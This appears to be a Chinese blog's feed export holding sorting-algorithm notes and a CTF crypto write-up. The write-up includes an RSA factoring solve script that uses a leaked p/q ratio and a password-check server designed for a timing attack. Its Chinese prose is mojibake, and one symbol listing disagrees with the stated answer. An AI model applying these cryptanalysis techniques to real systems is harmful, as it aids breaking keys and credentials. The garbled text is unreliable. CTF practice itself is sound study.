æ­¤æˆ‘ä»¬åœ¨è®¨è®ºå®‰å…¨æ€§æ—¶å¯ä»¥å°†å…¶å¿½ç•¥ã€‚åœ¨å·®åˆ†åˆ†æä¸­ï¼Œç”±äºDESé‡‡ç”¨çš„Feistelç»“æ„ï¼Œå¯¼è‡´å¯¹ä½è½®DESå’Œé«˜è½®DESçš„å·®åˆ†åˆ†æå¹¶ä¸ç›¸åŒã€‚<br>ç”±äºDESä½¿ç”¨çš„Sç›’çš„å·®åˆ†åˆ†å¸ƒå­˜åœ¨ä¸å‡åŒ€çš„ç‰¹æ€§ï¼Œå› æ­¤æˆ‘ä»¬åœ¨å¯¹DESç®—æ³•è¿›è¡Œå·®åˆ†åˆ†æä¹‹å‰è¦å¯¹Sç›’çš„å·®åˆ†ä¼ æ’­ç‰¹æ€§è¿›è¡Œç ”ç©¶ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CCF CSPåˆ·é¢˜ç¬”è®°</title>
    <link href="/2025/08/14/CCF%20CSP%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/08/14/CCF%20CSP%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ç”¨æ¥è®°å½•æˆ‘å¤‡è€ƒCSPçš„åˆ·é¢˜ç¬”è®°ï¼Œç”¨æ¥ç£ä¿ƒè‡ªå·±å­¦ä¹ ï¼Œäº‰å–è‡³å°‘æ¯æ—¥ä¸€é¢˜(à¸‡à¹‘ â€¢Ì€_â€¢Ì)à¸‡</p><h2 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h2><h3 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h3><h4 id="ç®—æ³•æ­¥éª¤"><a href="#ç®—æ³•æ­¥éª¤" class="headerlink" title="ç®—æ³•æ­¥éª¤"></a>ç®—æ³•æ­¥éª¤</h4><blockquote><p>æ—¶é—´å¤æ‚åº¦$O(n\log(n))$</p></blockquote><ul><li>é€‰æ‹©æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸ºåŸºå‡†<code>target</code></li><li>è®¾å®šä¸¤ä¸ªæŒ‡é’ˆ<code>i</code>å’Œ<code>j</code>ï¼Œå…¶ä¸­ï¼š<ul><li><code>i</code>æŒ‡å‘æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œ<code>j</code>æŒ‡å‘æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ </li><li><code>i</code>ä»å·¦å¾€å³éå†ï¼Œç›´åˆ°<code>i</code>æŒ‡å‘çš„å…ƒç´ å¤§äº<code>target</code></li><li><code>j</code>ä»å³å¾€å·¦éå†ï¼Œç›´åˆ°<code>j</code>æŒ‡å‘çš„å…ƒç´ å°äº<code>target</code></li><li>è‹¥æ­¤æ—¶<code>i&lt;j</code>ï¼Œäº¤æ¢<code>i</code>å’Œ<code>j</code>æŒ‡å‘çš„å…ƒç´ ï¼›å¦åˆ™ç›´æ¥è·³å‡ºå¾ªç¯</li><li>æœ€åå†å°†<code>i</code>å’ŒåŸºå‡†ä½ç½®ä¸Šçš„å…ƒç´ è¿›è¡Œäº¤æ¢ã€‚ï¼ˆè¿™æ ·å°±å®ç°äº†åŸºå‡†å…ƒç´ å·¦ä¾§çš„å…ƒç´ éƒ½$\leq$ <code>target</code>ï¼ŒåŸºå‡†å…ƒç´ å³ä¾§çš„å…ƒç´ éƒ½$&gt;$<code>target</code>ã€‚</li></ul></li><li>ç„¶åå†å¯¹åŸºå‡†å·¦ä¾§å’Œå³ä¾§çš„å­æ•°ç»„åˆ†åˆ«é€’å½’æ‰§è¡Œè¯¥ç®—æ³•ã€‚<br><strong>æ¨¡æ¿ï¼š</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(low &gt;= high) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">int</span> i=low,j=high;<br>    <span class="hljs-type">int</span> target = arr[low];<br><br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(arr[j] &gt;= target &amp;&amp; i &lt; j ) j--;<br>        <span class="hljs-keyword">if</span>(i &lt; j) arr[i] = arr[j];<br>        <span class="hljs-keyword">while</span>(arr[i] &lt;= target &amp;&amp; i &lt; j) i++;<br>        <span class="hljs-keyword">if</span>(i &lt; j) arr[j] = arr[i];<br>    &#125;<br>    arr[i] = target;<br>    <span class="hljs-built_in">quick_sort</span>(arr,low,i<span class="hljs-number">-1</span>);<br>    <span class="hljs-built_in">quick_sort</span>(arr,i<span class="hljs-number">+1</span>,high);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><p><strong>é¢˜ç›®</strong>ï¼š<a href="https://leetcode.cn/problems/sort-an-array/">912. æ’åºæ•°ç»„ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a><br><strong>çŸ¥è¯†ç‚¹ï¼š</strong><br>æœ¬é¢˜ä¸­ç›´æ¥æ‰“æ¿å­ä¼šå‘ç°å‡ºç°è¶…æ—¶æƒ…å†µï¼Œå› æ­¤æˆ‘ä»¬å°±éœ€è¦è¿›è¡Œä¸€äº›ä¼˜åŒ–ï¼š</p><ul><li><strong>ä¼˜åŒ–ç‚¹1ï¼š</strong> å°†<code>target</code>çš„é€‰å–éšæœºåŒ–ï¼Œè¿™æ ·èƒ½å¤Ÿé¿å…ä¸€äº›æ•°ç»„çš„åŸºå‡†ä¸€ç›´å–åˆ°æœ€å·®çš„æƒ…å†µã€‚å¹¶ä¸”å¯ä»¥ä½¿ç”¨<code>srand(time(nullptr));</code>æ¥ä¼˜åŒ–éšæœºæ•°çš„é€‰å–ã€‚</li><li><strong>ä¼˜åŒ–ç‚¹2ï¼š</strong> ä½¿ç”¨<code>Hoare</code>åˆ†åŒºæ³•ï¼Œå·¦å³æŒ‡é’ˆä¸æ–­äº¤æ¢å…ƒç´ ï¼ŒåŸºå‡†å€¼å§‹ç»ˆç•™åœ¨æ•°ç»„é‡Œï¼Œå¾ªç¯ç»“æŸåè‡ªç„¶å½’ä½ã€‚<br><strong>ä»£ç </strong>ï¼š</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (low &gt;= high) <span class="hljs-keyword">return</span>;<br><br>        <span class="hljs-type">int</span> idx = low + <span class="hljs-built_in">rand</span>() % (high - low + <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">swap</span>(arr[low], arr[idx]);<br>        <span class="hljs-type">int</span> target = arr[low];<br><br>        <span class="hljs-type">int</span> i = low - <span class="hljs-number">1</span>, j = high + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; j) &#123;<br>            <span class="hljs-keyword">do</span> i++; <span class="hljs-keyword">while</span> (arr[i] &lt; target);<br>            <span class="hljs-keyword">do</span> j--; <span class="hljs-keyword">while</span> (arr[j] &gt; target);<br>            <span class="hljs-keyword">if</span> (i &lt; j) <span class="hljs-built_in">swap</span>(arr[i], arr[j]);<br>        &#125;<br><br>        <span class="hljs-built_in">quick_sort</span>(arr, low, j);<br>        <span class="hljs-built_in">quick_sort</span>(arr, j + <span class="hljs-number">1</span>, high);<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sortArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">quick_sort</span>(nums.<span class="hljs-built_in">data</span>(), <span class="hljs-number">0</span>, (<span class="hljs-type">int</span>)nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> nums;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æœ€åæˆåŠŸé€šè¿‡<br><img src="/2025/08/14/CCF%20CSP%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/file-20250815020223559.png"></p><h3 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h3><h4 id="ç®—æ³•æ­¥éª¤-1"><a href="#ç®—æ³•æ­¥éª¤-1" class="headerlink" title="ç®—æ³•æ­¥éª¤"></a>ç®—æ³•æ­¥éª¤</h4><blockquote><p>æ—¶é—´å¤æ‚åº¦$O(n^2)$</p></blockquote><ul><li>ä»æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ä¸¤ä¸¤æ¯”è¾ƒï¼Œè‹¥é€†åºå°±äº¤æ¢é¡ºåºï¼Œè¿™æ ·ç»è¿‡<code>n-1</code>æ¬¡æ¯”è¾ƒåï¼Œæœ€åçš„å…ƒç´ å°±æ˜¯æœ€å¤§çš„å…ƒç´ </li><li>ç„¶åå†è¿›è¡Œ<code>n-1</code>æ¬¡å¾ªç¯åå°±å®Œæˆäº†æ’åº<br><strong>æ¨¡æ¿ï¼š</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bubble_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;n<span class="hljs-number">-1</span>-i; j++)<br>&#123;<br><span class="hljs-keyword">if</span>(arr[j] &gt; arr[j<span class="hljs-number">+1</span>]) <span class="hljs-built_in">swap</span>(arr[j],arr[j<span class="hljs-number">+1</span>]);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MTCTF 2021 Writeupï¼ˆå¤ç°ç»ƒä¹ ï¼‰</title>
    <link href="/2025/08/14/MTCTF%202021%20Writeup%EF%BC%88%E5%A4%8D%E7%8E%B0%E7%BB%83%E4%B9%A0%EF%BC%89/"/>
    <url>/2025/08/14/MTCTF%202021%20Writeup%EF%BC%88%E5%A4%8D%E7%8E%B0%E7%BB%83%E4%B9%A0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>NSSCTF Cryptoç»§ç»­åˆ·é¢˜ä¸­ï¼Œæœ¬æ–‡ç« ç”¨æ¥è®°å½•ï¼Œæœ‰é—®é¢˜æ¬¢è¿äº¤æµï¼¼(â—Â´Ï–â€™â—)ï¼</p><h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p><img src="/2025/08/14/MTCTF%202021%20Writeup%EF%BC%88%E5%A4%8D%E7%8E%B0%E7%BB%83%E4%B9%A0%EF%BC%89/Symbols.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>çœ‹æ ¼å¼åƒæ˜¯flagï¼ŒçŒœæµ‹å‰å››ä¸ªå­—æ¯å°±æ˜¯flagï¼Œä»”ç»†è§‚å¯Ÿå¯¹æ¯”ä¹‹åï¼Œå‘ç°å¸Œè…Šå­—æ¯$\lambda ,\alpha ,\gamma$çš„latexè¯­æ³•æ ‡æ³¨åˆ†åˆ«ä¸ºï¼š</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\lambda</span>,<span class="hljs-keyword">\alpha</span>,<span class="hljs-keyword">\gamma</span><br></code></pre></td></tr></table></figure><p>å‘ç°é¦–å­—æ¯åˆ†åˆ«å¯¹åº”$l,a,g$ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯$f$ï¼Œçœ‹èµ·æ¥åƒæ˜¯éŸ³ä¹ç¬¦å·ï¼Œæœç´¢ä¹‹åå‘ç°æ˜¯é™å·ï¼ˆflatï¼‰$\flat$å¯¹åº”$f$ï¼Œè¯æ˜æˆ‘ä»¬çš„æ€è·¯æ˜¯æ­£ç¡®çš„ï¼Œå°±æ˜¯è¦æ‰¾åˆ°å¯¹åº”ç¬¦å·çš„è‹±æ–‡è¯­æ³•çš„é¦–å­—æ¯ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¾¿æŒ¨ä¸ªå¯»æ‰¾å³å¯<br>æ‰¾åˆ°ä¸€ä¸ªå‚è€ƒåšå®¢ï¼š<a href="https://www.cnblogs.com/gaopursuit/p/17060810.html">Latexç¬¦å·å¤§å…¨ - é«˜å³°OUC - åšå®¢å›­</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\forall</span> <span class="hljs-string">\uplus</span> <span class="hljs-string">\nu</span> _ <span class="hljs-string">\Lambda</span> <span class="hljs-string">\alpha</span> T <span class="hljs-string">\epsilon</span> <span class="hljs-string">\Xi</span> _ T <span class="hljs-string">\approx</span> <span class="hljs-string">\triangleleft</span> <span class="hljs-string">\hbar</span><br></code></pre></td></tr></table></figure><p>å³$\forall \uplus \nu _ \Lambda \alpha T \epsilon \Xi _ M \approx \triangleleft \hbar$<br>å¯¹åº”çš„å­—ç¬¦ä¸º<code>fun_LaTeX_Math</code>ï¼Œè®¡ç®—å¾—åˆ°32ä¸ºmd5ä¸º<code>e1b217dc3b5e90b237b45e0a636e5a86</code></p><h1 id="Strange-rsa1"><a href="#Strange-rsa1" class="headerlink" title="Strange_rsa1"></a>Strange_rsa1</h1><h2 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> RealField<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag1<br><br><br>Bits = <span class="hljs-number">512</span><br>p = getPrime(Bits)<br>q = getPrime(Bits)<br>n = p * q<br><br>gift = RealField(prec=Bits*<span class="hljs-number">2</span>)(p) / RealField(prec=Bits*<span class="hljs-number">2</span>)(q)<br>e = <span class="hljs-number">0x10001</span><br>m = bytes_to_long(flag1)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>output = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>output.write(<span class="hljs-string">&#x27;n = &#x27;</span> + <span class="hljs-built_in">str</span>(n) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>output.write(<span class="hljs-string">&#x27;c = &#x27;</span> + <span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>output.write(<span class="hljs-string">&#x27;gift = &#x27;</span> + <span class="hljs-built_in">str</span>(gift) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>$gift &#x3D; \frac{p}{q},n&#x3D;p\cdot q$<br>å³$p &#x3D; \sqrt {gift\cdot n}&#x3D;\sqrt{p^2}$<br>è¿™é‡Œä½¿ç”¨sagemathä¸­çš„<code>sqrt</code>è¿›è¡Œé«˜ç²¾åº¦å¼€æ–¹ï¼Œä¹‹åæ­£å¸¸RSAè§£å¯†å³å¯</p><h2 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413</span><br>c = <span class="hljs-number">23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924</span><br>gift = <span class="hljs-number">0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938</span><br>e = <span class="hljs-number">0x10001</span><br>p = <span class="hljs-built_in">int</span>(sqrt(n*gift))<br><span class="hljs-comment">#print(p)</span><br>q = n // p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="Remeo"><a href="#Remeo" class="headerlink" title="Remeo"></a>Remeo</h1><h2 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> msg,password,flag<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) == <span class="hljs-number">32</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(password) == <span class="hljs-number">8</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> msg + <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(msg))%<span class="hljs-number">16</span>)])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        <br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)       <br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        right_num = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[~]Please input your password:&#x27;</span>)<br>            str1 = <span class="hljs-variable language_">self</span>.recv().strip()[:<span class="hljs-number">8</span>]<br>            true_num = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(password)):<br>                <span class="hljs-keyword">if</span> str1[i] != password[i]:<br>                    login = <span class="hljs-literal">False</span><br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;False!&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    true_num = i + <span class="hljs-number">1</span> <br><br>                <span class="hljs-keyword">if</span> right_num &gt; true_num:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">else</span>:<br>                    right_num = true_num<br><br>                <span class="hljs-keyword">if</span> true_num == <span class="hljs-built_in">len</span>(password):<br>                    login = <span class="hljs-literal">True</span><br>                check = <span class="hljs-string">b&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x2000</span>):<br>                    check = <span class="hljs-variable language_">self</span>.aes.encrypt(padding(check[:-<span class="hljs-number">1</span>] + str1[:i+<span class="hljs-number">1</span>]))<br><br>            <span class="hljs-keyword">if</span> login == <span class="hljs-literal">True</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;Login Success&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>,check[:<span class="hljs-number">16</span>]<br>            <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">100</span>)<br>        <span class="hljs-variable language_">self</span>.aes = AES.new(padding(password),AES.MODE_ECB)<br>        _,final_check = <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-keyword">if</span> _ == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">assert</span> msg.decode() == final_check.<span class="hljs-built_in">hex</span>()<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Good Morning Master!&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.send(flag)<br>            <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HOST:POST &quot;</span> + HOST+<span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(PORT))<br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åˆ†æé¢˜ç›®ï¼Œå‘ç°å½“<code>password</code>çš„æŸä¸€ä½æ­£ç¡®æ—¶éƒ½ä¼šè¿›è¡Œ0x2000æ¬¡AESåŠ å¯†ï¼Œå› æ­¤å¾ˆæ˜æ˜¾æš—ç¤ºæˆ‘ä»¬æ˜¯Time Attackï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´æ—¶æ£€éªŒä¸å‰ä¸€æ¬¡çˆ†ç ´æ—¶æ‰€éœ€è¦æ—¶é—´å·®çš„å¤§å°æ¥åˆ¤æ–­å½“å‰å­—ç¬¦æ˜¯å¦æ­£ç¡®ã€‚<br>å…·ä½“å¯å‚è€ƒï¼š<a 